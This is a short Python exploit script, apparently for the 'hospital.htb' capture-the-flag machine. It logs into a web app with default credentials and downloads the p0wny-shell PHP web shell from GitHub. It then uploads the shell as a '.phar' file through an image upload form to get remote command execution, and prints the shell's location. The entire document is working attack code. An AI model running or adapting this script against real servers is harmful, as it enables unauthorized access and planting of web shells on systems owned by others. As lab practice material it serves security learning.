import requests
import tempfile

url = 'http://hospital.htb:8080'

def login():
    endpoint = '/login.php'

    global session
    session = requests.Session()
    # session.proxies.update({'http': 'http://127.0.0.1:8080'}) # debug
    session.post(url + endpoint, data={'username': 'admin', 'password': '123456'})

def upload_shell():
    r = requests.get("https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php")

    with tempfile.NamedTemporaryFile() as tmp:
        tmp.write(r.content)
        tmp.flush()

        file = {
            'image': ('shell.phar', open(tmp.name, 'rb'), 'application/octet-stream')
        }
        endpoint = '/upload.php'
        session.post(url + endpoint, files=file)

    print("[+] Web Shell uploaded to: http://hospital.htb:8080/uploads/shell.phar")

if __name__ == '__main__':
    login()
    upload_shell()